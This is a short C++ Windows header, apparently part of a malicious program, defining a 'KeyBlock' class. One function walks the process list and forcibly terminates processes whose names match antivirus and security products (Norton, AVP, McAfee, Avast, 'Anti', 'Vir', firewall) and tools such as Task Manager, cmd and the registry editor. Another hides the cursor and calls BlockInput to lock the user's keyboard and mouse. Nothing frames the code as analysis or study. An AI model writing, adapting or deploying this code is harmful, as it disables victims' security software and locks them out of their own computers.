#pragma once
#include <Windows.h>
#include <sys\stat.h>
#include <tlhelp32.h>

class KeyBlock {
private:
	PROCESSENTRY32 peProcessEntry;
	char bad_windows_list[23][30] = { "Norton", "AVP" ,"Anti","Vir"," McAfee","anti","vir", "firewall" , "Task", "explorer", "opera", "chrome", 
									"secure", "cmd", "Reg", "reg", "Dr", "Avast", "WINWORD", "notepad", "conhost", "Microsoft", "Win"};
	HANDLE hSnapShot;
public:
	void BadWindows();
	void KeyBl();
	KeyBlock();
	~KeyBlock();
};

void KeyBlock::BadWindows() {
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapShot) {
		return;
	}
	peProcessEntry.dwSize = sizeof(PROCESSENTRY32);
	BOOL Fres = FALSE;
	for (int i = 0; i < 8; i++) {
		Process32First(hSnapShot, &peProcessEntry);
		do {
			Fres = false;
			if(strstr(peProcessEntry.szExeFile, bad_windows_list[i]) != NULL) Fres = true;
			if (Fres)
			{
				DWORD dwProcessId = peProcessEntry.th32ProcessID;
				if (dwProcessId != GetCurrentProcessId())
				{
					HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
					TerminateProcess(hProcess, 0);
					CloseHandle(hProcess);
				}
			}
		} while (Process32Next(hSnapShot, &peProcessEntry));
	}
}

void KeyBlock::KeyBl() {
	ShowCursor(false);
	BlockInput(true);
}

KeyBlock::KeyBlock() {

}

KeyBlock::~KeyBlock() {

}


